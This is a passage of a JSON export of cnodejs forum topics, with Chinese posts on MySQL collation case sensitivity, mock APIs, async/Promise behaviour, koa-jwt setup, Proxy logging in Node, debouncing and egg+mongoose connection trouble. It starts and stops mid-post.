API，官网地址：<a href=\"http://www.eolinker.com/#/?ref=cnodejs\">https://www.eolinker.com</a></p>\n<p><strong>1.先建立好文档</strong></p>\n<p><img src=\"//static.cnodejs.org/FhHSRXrXOXn14nvGSMF9UuUtImpV\" alt=\"9.png\"></p>\n<p><strong>2.建立期望进行测试</strong></p>\n<p><img src=\"//static.cnodejs.org/FstN4sd9yAo4-m61muPwShW0_jHb\" alt=\"10.png\"></p>\n<p><strong>3.写完后测试后返回的数据与我们的想要的一致</strong></p>\n<p><img src=\"//static.cnodejs.org/FrisE87rKiClZ1N7vo7RnwmGKD5T\" alt=\"11.png\"></p>\n<p><strong>4.第二种情况类似，就不赘述了</strong></p>\n<p><img src=\"//static.cnodejs.org/FlQYHEXQSJcSwv9RKipZaqU9pvPM\" alt=\"12.png\"></p>\n<p>本篇文章主要从测试层面和角度去介绍 MOCK API，下篇我会从开发的层面去介绍 MOCK API 的实际应用。希望对大家有所帮助。eolinker官网：<a href=\"https://s.growingio.com/gke2DD\">https://www.eolinker.com</a></p>\n</div>","title":"MOCK API 的定义及实践（使用eolinker实现）","last_reply_at":"2019-04-24T03:57:34.443Z","good":false,"top":false,"reply_count":0,"visit_count":324,"create_at":"2019-04-24T03:57:34.443Z","author":{"loginname":"wardennn","avatar_url":"https://avatars0.githubusercontent.com/u/33686934?v=4&s=120"}},{"id":"5cbf2d0037faec0ce1d05663","author_id":"58898ca65d4612c33919ea01","tab":"share","content":"<div class=\"markdown-text\"><h2>前言</h2>\n<p>MySQL中的大小写敏感问题，可以从服务器(Server)、数据库(Database)、表(Table)、字段(Column)这4个级别来配置，MySQL的很多配置、操作等都是基于这4个级别的。<strong>这4个级别的优先级为：字段&gt;表&gt;数据库&gt;服务器</strong>。而我们最关注的大小写敏感问题通常是对于数据而言的，举个简单的例子：字符串<code>book</code>和字符串<code>Book</code>存入到数据库后，我们通过SQL语句查询的时候，如果这两个字符串是相等的，那么说明MySQL比较这两个字符串的时候采用了<strong>大小写不敏感</strong>的方式，反之，则是使用了<strong>大小写敏感</strong>的方式。在讨论MySQL大小写敏感问题之前，我们需要先了解MySQL的两个概念：字符集(CHARACTER SET)和校对规则(Collation)。</p>\n<h2>字符集(CHARACTER SET)和校对规则(Collation)</h2>\n<p>字符集的通常解释是：符号和编码的集合。举个例子：假设我们有4个字母：A,B,a,b。我们给每个字母编个号码：A=0,B=1,a=3,b=4。我们就可以说字母A是符号，编号0是它的编码。所有的字母和它们的编码组合起来就是我们通常说的字符集。如果我们想要比较两个字符串A和B的值的大小，那么我们很容就想到他们的编码，A的编码是0，B的编码是1，因为<strong>0小于1</strong>，所以<strong>字符串A小于字符串B</strong>。我们做的这个比较就是给这个<strong>字符集(CHARACTER SET)<strong>应用了一套</strong>校对规则(Collation)</strong>。</p>\n<p>MySQL拥有一套完整的字符集和校对规则。每一种字符集至少包含一种校对规则，且每种字符集都有默认的校对规则。</p>\n<ul>\n<li>可以使用<code>SHOW CHARACTER SET</code>语句查看MySQL支持的字符集列表：</li>\n</ul>\n<p><img src=\"//static.cnodejs.org/Fs5W4175f-BxtEa5CClHQzRUYk_9\" alt=\"show_character_set.png\"></p>\n<ul>\n<li>可以使用<code>SHOW COLLATION</code>语句查看MySQL支持的校对规则：</li>\n</ul>\n<p><img src=\"//static.cnodejs.org/FlZ58tmuNj7_ZFUiOxxL2XaJEMul\" alt=\"show_collation.png\"></p>\n<h2>大小写敏感问题</h2>\n<p>接着上面的例子，如果我们想要大写字母A和小写字母a是相等的呢？那么我们需要做的就是将大写字母A和小写字母a的编码设置为一致的，然后比较它们的编码即可。这就是我们通常说的<strong>大小写不敏感校对规则</strong>。反之，如果将大写字母A和小写字母a视为不相等的，就是我们通常说的<strong>大小写敏感校对规则</strong>。</p>\n<p>在不指定字符集和校对规则的情况下，MySQL会使用默认的字符集(utf8)和校对规则(utf8_general_ci)。校对规则的名称遵循规则：<strong>以其相关的字符集开头，后加上一个或者多个后缀用于区分不同的校对规则</strong>。相关后缀说明：</p>\n<table>\n<thead>\n<tr>\n<th>后缀</th>\n<th>含义</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>_ai</td>\n<td>口音不敏感(Accent insensitive)</td>\n</tr>\n<tr>\n<td>_as</td>\n<td>口音敏感(Accent sensitive)</td>\n</tr>\n<tr>\n<td>_ci</td>\n<td>大小写不敏感(Case insensitive)</td>\n</tr>\n<tr>\n<td>_cs</td>\n<td>大小写敏感(case-sensitive)</td>\n</tr>\n<tr>\n<td>_ks</td>\n<td>假名敏感(Kana sensitive)</td>\n</tr>\n<tr>\n<td>_bin</td>\n<td>二进制(Binary，大小写敏感)</td>\n</tr>\n</tbody>\n</table>\n<p>由此可以知道：<strong>默认情况下，MySQL所使用的校对规则是大小写不敏感的</strong>。</p>\n<h2>设置大小写敏感</h2>\n<p>在日常的开发场景中，可能很少遇到需要设置大小写敏感的场景，而我恰巧遇到了。下面举例说明：</p>\n<ul>\n<li>先创建一张用户表：</li>\n</ul>\n<pre class=\"prettyprint language-sql\"><code>CREATE TABLE &#96;users&#96; (\n  &#96;username&#96; varchar(32) NOT NULL,\n  &#96;nickname&#96; varchar(32) DEFAULT NULL,\n  PRIMARY KEY (&#96;username&#96;)\n) ENGINE=InnoDB DEFAULT CHARSET=utf8;\n</code></pre><blockquote>\n<p>这里我们先使用默认的字符集和校对规则。</p>\n</blockquote>\n<ul>\n<li>插入两条数据：</li>\n</ul>\n<pre class=\"prettyprint language-sql\"><code>INSERT INTO &#96;cs_test&#96;.&#96;users&#96; (&#96;username&#96;, &#96;nickname&#96;) VALUES (&#x27;user1&#x27;, &#x27;black&#x27;);\nINSERT INTO &#96;cs_test&#96;.&#96;users&#96; (&#96;username&#96;, &#96;nickname&#96;) VALUES (&#x27;user2&#x27;, &#x27;match&#x27;);\n</code></pre><ul>\n<li>查询数据：</li>\n</ul>\n<pre class=\"prettyprint language-sql\"><code>SELECT * FROM users WHERE username=&#x27;user1&#x27;;\nSELECT * FROM users WHERE username=&#x27;usER1&#x27;;\n</code></pre><p>这两条SQL语句的查询结果是一致的：</p>\n<p><img src=\"//static.cnodejs.org/FoCZ0sgzzk6Qw9-MXofSscaYny_3\" alt=\"query_user.png\"></p>\n<ul>\n<li>现在我需要向<code>users</code>表中插入一条<code>username</code>为<strong>useR1</strong>的<strong>另外一个用户</strong>，发现报错了：</li>\n</ul>\n<pre class=\"prettyprint language-sql\"><code>INSERT INTO &#96;cs_test&#96;.&#96;users&#96; (&#96;username&#96;, &#96;nickname&#96;) VALUES (&#x27;useR1&#x27;, &#x27;whatever&#x27;);\n</code></pre><p><img src=\"//static.cnodejs.org/FpwpmAiY63fyaDplDyCRrKuzuLQh\" alt=\"insert_error.png\"></p>\n<p>理由很简单：因为MySQL此时使用的是大小写不敏感的校对规则，所以<code>user1</code>和<code>useR1</code>是相等的，而<code>username</code>是<code>users</code>表的<strong>主键</strong>，所以在插入数据时会报主键冲突的错误。</p>\n<ul>\n<li>设置<code>users</code>表的<code>username</code>字段使用<strong>大小写敏感</strong>的校对规则：</li>\n</ul>\n<pre class=\"prettyprint language-sql\"><code>ALTER TABLE &#96;cs_test&#96;.&#96;users&#96; \nCHANGE COLUMN &#96;username&#96; &#96;username&#96; VARCHAR(32) CHARACTER SET &#x27;utf8&#x27; COLLATE &#x27;utf8_bin&#x27; NOT NULL ;\n</code></pre><p>然后再次尝试插入数据，这次插入成功了。此时<code>users</code>表中的数据如下：</p>\n<p><img src=\"//static.cnodejs.org/FpY2ct_WQuLz4HozUPsCEDMpwiJl\" alt=\"users.png\"></p>\n<ul>\n<li>再次查询用户表：</li>\n</ul>\n<p><img src=\"//static.cnodejs.org/FnrU3mxvVrXefOJ8oglW9D6MksuP\" alt=\"query_user_again_1.png\"></p>\n<p><img src=\"//static.cnodejs.org/FkJfDzcEy_hzTwmawJs8WN9VF6fc\" alt=\"query_user_again_2.png\"></p>\n<p><img src=\"//static.cnodejs.org/FsPFf21hGtB1uZNkajdCrVzf1bmH\" alt=\"query_user_again_3.png\"></p>\n<p>发现这次<code>users</code>表的<code>username</code>字段已经彻底变成了<strong>大小写敏感</strong>了。</p>\n<h2>总结</h2>\n<ul>\n<li>本文讨论的是MySQL数据校对规则的大小写敏感问题，而不是讨论表名的大小写敏感问题（网上很多文章都是讨论表名的大小写敏感问题）。</li>\n<li>对MySQL的字符集和校对规则有一定的了解后有助于理解大小写敏感问题。</li>\n<li>MySQL的<code>utf8</code>字符集并没有<code>utf8_general_cs</code>校对规则，网上有些文章存在误导。</li>\n<li>MySQL的<code>utf8_bin</code>校对规则是大小写敏感的。</li>\n<li>MySQL的4个级别优先级为：字段(Column)&gt;表(Table)&gt;数据库(Database)&gt;服务器(Server)，进行相关配置时尤其要注意。</li>\n<li>最好不要对主键等其他含有索引的字段设置大小写敏感，容易导致索引失效，从业务角度考虑也不太合理。</li>\n</ul>\n</div>","title":"浅谈MySQL中的大小写敏感问题","last_reply_at":"2019-04-24T02:56:10.126Z","good":false,"top":false,"reply_count":2,"visit_count":434,"create_at":"2019-04-23T15:19:28.654Z","author":{"loginname":"blackmatch","avatar_url":"https://avatars3.githubusercontent.com/u/12443954?v=4&s=120"}},{"id":"5cbf14f9a86ae80ce64b2bf3","author_id":"56b8352e71204e03637a385f","tab":"share","content":"<div class=\"markdown-text\"><p>凡是能导到线上的都已经尝试过了，现在转化用户成本非常高，到了强者恒强的时代\n互联网裁员，是综合因素导致，大环境下的必然产物。一般情况下各行业周期为20年左右，这个周期相对准确。我们来详细解读下，互联网行业从1998年起步，直至新浪、网易、搜狐、腾讯的鼎立，标志着互联网进入高速发展时期，随后阿里、百度、腾讯崛起，成为互联网行业的标杆企业，中国的人口红利，形成了巨大的流量池，流量主导着一切，雷军曾说过：在风口上，猪都能飞起来！</p>\n<p>直到2018年，我们能明显感知流量红利时代已经结束，因为流量越来越贵、引新越来越少，从一线到二线，从二线到三四线，凡是能导到线上的都已经尝试过了，互联网企业开始进入细分用户及细分服务阶段。举个例子，我所知晓的某电商为例，2007年的消费转化用户成本为15元，那几年的销售额与公司规模几乎年年呈10倍增长，而2018年的消费转化用户成本却高达700元，其中仅有1-2次消费、消费总额不超过300元的用户占比达到了60%，试想下，如此高昂的引新成本，加之近年来各项经营成本的增长，企业财报如何才能做到正向营利，以支撑后续发展？要活下去该怎么办？无非从这三个方面着手：缩减营销预算（广告投入）、减少产品研发成本（创新投入）、减少人力成本（人员投入）。\n最近几天，各媒体争相报导着“互联网寒冬”，对此，我却认为，2019年是最有挑战、最有希望的一年，因为很多凑热闹的行业搅局者、不具备实力的人会出局，这是行业与人才的又一次洗牌。在风口上，猪都能飞起来，当风吹过，一切虚妄的价值就会被打回原形，唯有坚持、真正交付价值的企业才能存活，而真正具备实力的人才也会获得更多机会与可能，并且在未来活得很好。\n大破必有大立！危与机永远并存！不信？一年后再来回顾本篇。觉得不错还可以前往我的主页查看更多BAT架构技术进阶+面试真经等干货~</p>\n<p><a href=\"https://www.cnblogs.com/findumars/p/10165587.html\">https://www.cnblogs.com/findumars/p/10165587.html</a></p>\n</div>","title":"凡是能导到线上的都已经尝试过了，现在转化用户成本非常高，到了强者恒强的时代","last_reply_at":"2019-04-24T02:20:47.633Z","good":false,"top":false,"reply_count":3,"visit_count":782,"create_at":"2019-04-23T13:36:57.543Z","author":{"loginname":"yhc-yhc","avatar_url":"https://avatars1.githubusercontent.com/u/16659510?v=4&s=120"}},{"id":"5cb552aa1d8a69797aa66c4e","author_id":"5b66a03fb71aedfe4c12675f","tab":"ask","content":"<div class=\"markdown-text\"><p>如题</p>\n</div>","title":"node+mongodb编程，如何实现一致性，大神有没有推荐的工具或相似的工具参考参考","last_reply_at":"2019-04-24T01:30:50.940Z","good":false,"top":false,"reply_count":3,"visit_count":1053,"create_at":"2019-04-16T03:57:30.137Z","author":{"loginname":"msforest","avatar_url":"https://avatars0.githubusercontent.com/u/16268045?v=4&s=120"}},{"id":"5cbe812737faec0ce1d04de3","author_id":"5cbe7dfd37faec0ce1d04d91","tab":"ask","content":"<div class=\"markdown-text\"><pre class=\"prettyprint\"><code>router.getTagsArr = async function (tag = []) {\n    var tags = [];\n    for (var val of tag) {\n        var db = await router.getTags(val);&#x2F;&#x2F;这个方法返回的是new Promise\n        tags.push(db);\n    }\n\n    console.log(tags, 1);\n\t&#x2F;&#x2F;return tags;\n    return 12;\n}\n\n\nconsole.log(router.getTagsArr());\n</code></pre><p>如果这样调用，得到的结果是：\n第一行：Promise { &lt;pending&gt; }\n第二行[。。。。。略] 1\n（注，第二行是console.log(tags, 1);）</p>\n<p>如果我console.log(await router.getTagsArr());\n第一行[。。。。。略] 1\n第二行12</p>\n<p>显然，第二个结果是我要的。但是getTagsArr方法我并没有返Promise对象，他怎么就自动变成这样呢？\n我知道这个是async定义影响的，但是这个关键字不是指定这个方法内，可以开启同步么？await。</p>\n</div>","title":"async定义的function直接就返Promise对象","last_reply_at":"2019-04-23T16:23:01.435Z","good":false,"top":false,"reply_count":3,"visit_count":675,"create_at":"2019-04-23T03:06:15.957Z","author":{"loginname":"jsnnid","avatar_url":"https://avatars2.githubusercontent.com/u/33336408?v=4&s=120"}},{"id":"5cbebd1837faec0ce1d05283","author_id":"5520a425ce156cc206687c5c","tab":"share","content":"<div class=\"markdown-text\"><p>很多小伙伴有一个烦恼，如何在js文件中引用ts。很多项目的依赖项中，尤其是历史遗留项目，不能将整个项目ts化，比如说sequelize的migration文件如何做成ts呢？那这个文件如果依赖其他文件，其他文件是不是就必须转成js格式呢？</p>\n<p>有了Load Any File!，再不用麻烦了，直接在js文件中const myUtil = loafFile(’./helper/myUtil.ts’)，即可引入一个ts文件的module。</p>\n<p>我的初衷是允许开发者使用任意他/她喜欢的语言写配置。比如说，.babelrc.json，.babelrc.yaml，webpack.config.ts，这是不是能让一些有强迫症的开发者觉得代码风格更统一呢？虽然不推荐js，ts混用，也不推荐这种方式来使用Load Any File!，但是觉得能够为一些朋友江湖救急，所以写下了这个帖子。</p>\n<p>这里是Load Any File!的Github地址，测试覆盖率100%，无依赖项，功能稳定。支持node.js 6 - 11。\n<a href=\"https://github.com/zhangkaiyulw/load-any-file\">https://github.com/zhangkaiyulw/load-any-file</a></p>\n</div>","title":"在js文件中引用ts文件成为可能，任意文件都可以引用","last_reply_at":"2019-04-23T14:07:10.797Z","good":false,"top":false,"reply_count":1,"visit_count":485,"create_at":"2019-04-23T07:22:00.932Z","author":{"loginname":"cheunghy","avatar_url":"https://avatars0.githubusercontent.com/u/3055936?v=4&s=120"}},{"id":"5cbf11aea86ae80ce64b2bdc","author_id":"584d7dce4c17b38d35436595","tab":"ask","content":"<div class=\"markdown-text\"><blockquote>\n<p>在入口文件中对login、register过滤不需要进行验证，通过isRevoked对其他的接口的token验证。为什么访问getuserinfo的时候不加 <code>Bear token</code>请求头authoration也能访问到接口的信息。网上搜寻了很多博客文章，还是直接可以不加token的header访问到别的接口，表示很疑问</p>\n</blockquote>\n<ul>\n<li>app.js入口文件</li>\n</ul>\n<pre class=\"prettyprint language-bash\"><code>\tconst Koa = require(&quot;koa&quot;);\n\tconst app = new Koa();\n\tconst json = require(&quot;koa-json&quot;);\n\tconst onerror = require(&quot;koa-onerror&quot;);\n\tconst bodyparser = require(&quot;koa-bodyparser&quot;);\n\tconst logger = require(&quot;koa-logger&quot;);\n\tconst koaJwt = require(&quot;koa-jwt&quot;);\n\tconst router = require(&quot;.&#x2F;routes&#x2F;index&quot;);\n\tconst config = require(&quot;.&#x2F;config&#x2F;index&quot;);\n\tconst util = require(&quot;.&#x2F;util&#x2F;index&quot;);\n\tconst errorHandle = require(&quot;.&#x2F;util&#x2F;error.js&quot;);\n\tconst { connect } = require(&quot;.&#x2F;model&#x2F;init&quot;);\n\tonerror(app);\n\t\n\tapp.use(\n\t  bodyparser({\n\t\tenableTypes: [&quot;json&quot;, &quot;form&quot;, &quot;text&quot;]\n\t  })\n\t);\n\tapp.use(json());\n\tapp.use(logger());\n\tapp.use(require(&quot;koa-static&quot;)(__dirname + &quot;&#x2F;public&quot;));\n\tapp.use(async (ctx, next) =&gt; {\n\t  const start = new Date();\n\t  await next();\n\t  const ms = new Date() - start;\n\t  console.log(&#96;${ctx.method} ${ctx.url} - ${ms}ms&#96;);\n\t});\n\tapp.use(errorHandle);\n\tapp.use(router.routes(), router.allowedMethods());\n\tapp.use(\n\t  koaJwt({\n\t\tsecret: config.secret,\n\t\tisRevoked: util.verify\n\t  }).unless({\n\t\tpath: [&#x2F;\\&#x2F;login&#x2F;, &#x2F;\\&#x2F;register&#x2F;]\n\t  })\n\t);\n\t(async () =&gt; {\n\t  await connect();\n\t})();\n\tapp.on(&quot;error&quot;, (err, ctx) =&gt; {\n\t  console.error(&quot;server error&quot;, err, ctx);\n\t});\n\tmodule.exports = app;\n</code></pre><ul>\n<li>jwt的401，errorhandle文件</li>\n</ul>\n<pre class=\"prettyprint language-bash\"><code>\tmodule.exports = (ctx, next) =&gt; {\n\t&#x2F;&#x2F; console.log(ctx.request.body);\n\treturn next().catch(err =&gt; {\n\t  if (err.status === 401) {\n\t\tctx.status = 401;\n\t\tctx.body = &quot;UnAthoration to get the data&quot;;\n\t  } else {\n\t\tthrow err;\n\t  }\n\t});\n  };\n</code></pre><ul>\n<li>路由控制文件</li>\n</ul>\n<pre class=\"prettyprint language-bash\"><code>\tconst userModel = require(&quot;..&#x2F;model&#x2F;userModel.js&quot;);\n\tconst config = require(&quot;..&#x2F;config&#x2F;index.js&quot;);\n\tconst util = require(&quot;..&#x2F;util&#x2F;index&quot;);\n\tmodule.exports = {\n\t  register: async (ctx, next) =&gt; {\n\t\tconsole.log(&quot;****&quot;,ctx);\n\t\tlet { name, password } = ctx.request.body;\n\t\tif (name &amp;&amp; password) {\n\t\t  password = util.createHash(password);\n\t\t  const result = await new userModel({\n\t\t\tname: name,\n\t\t\tpassword: password\n\t\t  }).save();\n\t\t  console.log(&quot;register result is&quot;, result);\n\t\t  if (!result)\n\t\t\treturn (ctx.body = {\n\t\t\t  code: &quot;400&quot;,\n\t\t\t  message: &quot;register fail&quot;\n\t\t\t});\n\t\t  else\n\t\t\treturn (ctx.body = {\n\t\t\t  code: &quot;200&quot;,\n\t\t\t  message: &quot;register success!&quot;\n\t\t\t});\n\t\t}\n\t  },\n\t  login: async (ctx, next) =&gt; {\n\t\tconst data = ctx.request.body;\n\t\tif (!data.name || !data.password) {\n\t\t  return (ctx.body = {\n\t\t\tcode: &quot;&quot;,\n\t\t\tdata: null,\n\t\t\tmessage: &quot;the usernumber or password can&#x27;t be null&quot;\n\t\t  });\n\t\t}\n\t\tdata.password = util.createHash(data.password);\n\t\tconst result = await userModel.find({\n\t\t  name: data.name,\n\t\t  password: data.password\n\t\t});\n\t\tif (result &amp;&amp; result.length) {\n\t\t  const token = util.sign(result);\n\t\t  return (ctx.body = {\n\t\t\tcode: &quot;200&quot;,\n\t\t\ttoken: token,\n\t\t\tmessage: &quot;login success&quot;\n\t\t  });\n\t\t} else {\n\t\t  return (ctx.body = {\n\t\t\tcode: &quot;400&quot;,\n\t\t\tdata: null,\n\t\t\tmessage: &quot;usernumber or password is error&quot;\n\t\t  });\n\t\t}\n\t  },\n\t  getuserinfo: async (ctx, next) =&gt; {\n\t\treturn (ctx.body = {\n\t\t  msg: &quot;nothing&quot;\n\t\t});\n\t  }\n\t};\n\n</code></pre><ul>\n<li>jwt验证文件</li>\n</ul>\n<pre class=\"prettyprint language-bash\"><code>\tconst crypto = require(&quot;crypto&quot;);\n\tconst config = require(&quot;..&#x2F;config&#x2F;index&quot;);\n\tconst jwt = require(&quot;jsonwebtoken&quot;);\n\tmodule.exports = {\n\t  createHash: value =&gt; {\n\t\tconst hmac = crypto.createHash(&quot;sha256&quot;, config.secret);\n\t\thmac.update(value);\n\t\treturn hmac.digest(&quot;hex&quot;);\n\t  },\n\t  sign(result) {\n\t\treturn jwt.sign(\n\t\t  {\n\t\t\t_id: result._id,\n\t\t\tname: result.name\n\t\t  },\n\t\t  config.secret,\n\t\t  config.expiresIn\n\t\t);\n\t  },\n\t  verify(ctx, decodedToken, token) {\n\t\tlet ret = true;\n\t\ttry {\n\t\t  const payload = jwt.verify(token, config.secret);\n\t\t  console.log(payload);\n\t\t  if(payload)\n\t\t\tret = false;\n\t\t} catch (err) {\n\t\t  console.log(err.name);\n\t\t}\n\t\treturn ret;\n\t  }\n\t};\n</code></pre></div>","title":"关于koa-jwt使用的疑问","last_reply_at":"2019-04-23T13:47:42.828Z","good":false,"top":false,"reply_count":2,"visit_count":350,"create_at":"2019-04-23T13:22:54.565Z","author":{"loginname":"1261407209LHH","avatar_url":"https://avatars0.githubusercontent.com/u/15929863?v=4&s=120"}},{"id":"5cbf04e237faec0ce1d05531","author_id":"59227363d371b6372a8afc26","tab":"ask","content":"<div class=\"markdown-text\"><pre class=\"prettyprint language-javascript\"><code>class Test {\n    constructor() {\n        this.test = new Proxy({ foo() {} }, {\n            get(target, name) {\n                console.log(&#x27;name: &#x27;, name);\n            },\n        });\n    }\n}\n\nconst test = new Test();\n\nconsole.log(test);\n&#x2F;*\nname:  Symbol(nodejs.util.inspect.custom)\nname:  Symbol(Symbol.toStringTag)\nname:  Symbol(Symbol.iterator)\nTest { test: { foo: [Function: foo] } }\n*&#x2F;\n</code></pre><p>在浏览器中运行以上代码不会出现这些额外的get访问<br>\n为什么会出现这种情况？有没有办法避免？\n环境：<code>Nodejs v11.14.0</code> <code>win10 x64 1809</code></p>\n</div>","title":"在nodejs中console.log一个class实例对象时，对象中的Proxy出现了额外的get访问","last_reply_at":"2019-04-23T13:05:19.584Z","good":false,"top":false,"reply_count":1,"visit_count":257,"create_at":"2019-04-23T12:28:18.350Z","author":{"loginname":"dislido","avatar_url":"https://avatars2.githubusercontent.com/u/25094788?v=4&s=120"}},{"id":"5b60495e58db3ccf66a450c6","author_id":"54054f7c0256839f714716ea","tab":"ask","content":"<div class=\"markdown-text\"><p>egg的多进程模型\n<a href=\"https://eggjs.org/zh-cn/core/cluster-and-ipc.html\">https://eggjs.org/zh-cn/core/cluster-and-ipc.html</a></p>\n</div>","title":"nest如何实现多进程间通信和egg类似的agent机制","last_reply_at":"2019-04-23T12:49:53.923Z","good":false,"top":false,"reply_count":17,"visit_count":2431,"create_at":"2018-07-31T11:34:54.211Z","author":{"loginname":"yuu2lee4","avatar_url":"https://avatars1.githubusercontent.com/u/8046366?v=4&s=120"}},{"id":"5cb6a8ada86ae80ce64b01aa","author_id":"53e1802fbd3cc3e50ba9e311","tab":"share","content":"<div class=\"markdown-text\"><p>给大家讲一个&quot;十动然拒&quot;的故事：</p>\n<p>2018年6月，Nodejs 之父刚刚开发 deno 不久，Protobuf 的作者建议 deno 不要使用 Protobuf，并向 ry 推荐了自己开发的 Cap’n Proto，性能非常卓越 <a href=\"https://github.com/denoland/deno/issues/269\">https://github.com/denoland/deno/issues/269</a>。ry 和 kentonv 围绕性能问题展开了近一个月的深入探讨，ry 十分感动，然后……拒绝了 kentonv 的推荐，而选择了 flatbuffers。昨天 ry 新开了一个 issue，打算替换掉 flatbuffers 库 <a href=\"https://github.com/denoland/deno/issues/2121\">https://github.com/denoland/deno/issues/2121</a> 因为根据 deno 的基准测试数据看，目前的性能瓶颈就是 flatbuffers, 随后 kentonv 又被重新召唤出来。</p>\n</div>","title":"给大家讲一个\"十动然拒\"的故事，Nodejs 之父有些尴尬","last_reply_at":"2019-04-23T07:39:40.985Z","good":false,"top":false,"reply_count":12,"visit_count":2979,"create_at":"2019-04-17T04:16:45.855Z","author":{"loginname":"justjavac","avatar_url":"https://avatars1.githubusercontent.com/u/359395?v=4&s=120"}},{"id":"5cbea752a86ae80ce64b26ec","author_id":"5cbd569fa86ae80ce64b1ce6","tab":"ask","content":"<div class=\"markdown-text\"><p>cnode哪些接口可以调用？</p>\n</div>","title":"cnode哪些接口可以调用？","last_reply_at":"2019-04-23T06:13:19.749Z","good":false,"top":false,"reply_count":2,"visit_count":451,"create_at":"2019-04-23T05:49:06.831Z","author":{"loginname":"xjinky","avatar_url":"https://avatars1.githubusercontent.com/u/30654234?v=4&s=120"}},{"id":"5cbea10d37faec0ce1d04f98","author_id":"5cbe957fa86ae80ce64b261a","tab":"ask","content":"<div class=\"markdown-text\"><p>node.js安装</p>\n</div>","title":"node.js安装","last_reply_at":"2019-04-23T05:43:50.564Z","good":false,"top":false,"reply_count":3,"visit_count":324,"create_at":"2019-04-23T05:22:21.193Z","author":{"loginname":"kwh123","avatar_url":"https://avatars1.githubusercontent.com/u/46155383?v=4&s=120"}},{"id":"5cbe81a237faec0ce1d04deb","author_id":"5ac08cdf679ac2ad2c492a21","tab":"ask","content":"<div class=\"markdown-text\"><ul>\n<li>\n<p>使用场景\n输入框输入值后<code>500</code>ms内没变化, 将值作为查询条件请求数据</p>\n</li>\n<li>\n<p>问题描述</p>\n</li>\n</ul>\n<ol>\n<li>\n<p>输入值为1, 请求到500条数据, 耗时3s, 待数据返回重新渲染</p>\n</li>\n<li>\n<p>距上次输入1后,经过1s后, 输入2,(当前查询条件为12) 请求到5条数据, 耗时300ms, 待数据返回重新渲染</p>\n</li>\n</ol>\n<p>这个过程中, 第二次数据返回是时间比第一次快, 所以最终的情况是输入框的值为12, 但是渲染的数据为1的请求数据</p>\n<ul>\n<li>解决方案\n我目前使用的一个解决方案是使用<code>XMLHttpRequest.abort()</code>, 来终端第一个请求</li>\n</ul>\n<p><a href=\"https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/abort\">XMLHttpRequest.abort()</a></p>\n<p>感觉这个方法比较局限,所以想问一问各位大佬, 有没有更适合的觉得方案?</p>\n</div>","title":"请教一下防抖动问题","last_reply_at":"2019-04-23T04:45:48.653Z","good":false,"top":false,"reply_count":3,"visit_count":603,"create_at":"2019-04-23T03:08:18.192Z","author":{"loginname":"MeetTheBest","avatar_url":"https://avatars1.githubusercontent.com/u/21294768?v=4&s=120"}},{"id":"5cbe82b5a86ae80ce64b2416","author_id":"5cbe8163a86ae80ce64b23fb","tab":"ask","content":"<div class=\"markdown-text\"><p>在vue项目中装了webpack-dev-server。webpack.dev.conf.js中 before里对一些请求返回json数据，数据来自mock文件，例如：\nbefore(mockRoute) {\nmockRoute.get(’/foo/bar’, (req,resp) =&gt; {\nvar content = require(’…/mock/foo/bar.json’)\n\tresp.json(content)\n});\n}\n工作正常，但修改了bar.json中的内容后，每次都要重启node才能获取新数据，有没有什么配置项/途径可以让我不重启node修改bar.json后能拿到新数据？</p>\n</div>","title":"使用express，模拟数据文件能热加载吗","last_reply_at":"2019-04-23T03:33:03.260Z","good":false,"top":false,"reply_count":2,"visit_count":311,"create_at":"2019-04-23T03:12:53.979Z","author":{"loginname":"LanserShi","avatar_url":"https://avatars3.githubusercontent.com/u/20268034?v=4&s=120"}},{"id":"5cbd3d2237faec0ce1d04652","author_id":"5bc6779d37a6965f5905229a","tab":"ask","content":"<div class=\"markdown-text\"><p>egg + mongoose，无法正常连接mongoose，浏览器一直停在 等候 状态，求助大神</p>\n<p>我使用egg  + mongoose，按标准的方式，就是无法访问mongodb，不管mongodb是关闭或启动，都无法访问，在浏览器就停在那里！</p>\n<p>01、app\\model\\admin.js\n<img src=\"//static.cnodejs.org/FuAXTicFNUMQSOcHFNHpCkIXa-P3\" alt=\"image.png\"></p>\n<p>02、app\\controller\\admin\\dbtest.js</p>\n<p><img src=\"//static.cnodejs.org/FgCcw1OGBu933iS8UPwuUgoFYXEI\" alt=\"image.png\">\n03、app\\router.js</p>\n<p><img src=\"//static.cnodejs.org/FrFhEKB98bwcNO9RWSBNvC5Hb0fW\" alt=\"image.png\">\n04、config\\config.default.js\n<img src=\"//static.cnodejs.org/FnMlGdgl6FNB-5YHKSQWX9xTXnAN\" alt=\"image.png\">\n05、config\\plugin.js\n<img src=\"//static.cnodejs.org/Fv7HU_xc6BQTpTO0HDYpZnZDIvvN\" alt=\"image.png\">\n06、打开浏览器，输入http://127.0.0.1:7001/db/dbtest\n<img src=\"//static.cnodejs.org/FpyLePq1JQV-l0g-MIwcK4PwuSqA\" alt=\"image.png\">\n画面就一直停在那里wait</p>\n<p>07、执行的结果(console)\n<img src=\"//static.cnodejs.org/FjuNNR40vNgdB0WlS2B94vhrmUEw\" alt=\"image.png\">\n没有其他的代码了，就只用了egg-init  --type=simple  mongolab</p>\n<p>mongodb可正常连线\n<img src=\"//static.cnodejs.org/Fpfh5WsBF9JMildHGXXWHC_IGfGk\" alt=\"image.png\">\n浏览器打开後，输入http://127.0.0.1:7001/db/dbtest</p>\n<p>visual studio code的console显示如下</p>\n<p><img src=\"//static.cnodejs.org/Fjj9WtdbeGHCPbAUM_H9MXAzj8jK\" alt=\"image.png\"></p>\n<p>有进入执行，\n但是到了var result = await this.ctx.model.find({})) ;<br>\n就停住了，浏览器也一直停在那里，没有结束，一直呈现「等候」的状态。</p>\n<p>麻烦大神了</p>\n</div>","title":"egg + mongoose，无法正常连接mongoose，浏览器一直停在 等候 状态，求助大神","last_reply_at":"2019-04-23T02:38:44.442Z","good":false,"top":false,"reply_count":13,"visit_count":978,"create_at":"2019-04-22T04:03:46.237Z","author":{"loginname":"Solomonqoo","avatar_url":"https://avatars3.githubusercontent.com/u/44214486?v=4&s=120"}},{"id":"5cb8081b37faec0ce1d033a7","author_id":"565553143325bb2c4ebd803a","tab":"share","content":"<div class=\"markdown-text\"><p>前段时间在开发中碰到一个小问题，揭露了我工作多年依然是个菜鸟并且基础知识不够扎实的毛病，现记录下来跟大家分享。为方便重现问题的核心，文中用了最为简洁的代码来模拟当时的场景。</p>\n<h2>一个异常的行为</h2>\n<p>某天开发了一个REST接口让前端调用，它大概是这个样子：</p>\n<pre class=\"prettyprint 